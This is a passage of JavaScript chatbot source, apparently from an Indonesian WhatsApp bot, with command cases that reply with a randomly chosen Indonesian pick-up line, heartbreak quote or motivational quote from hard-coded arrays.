    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
case 'danzygalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
case 'danzymotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
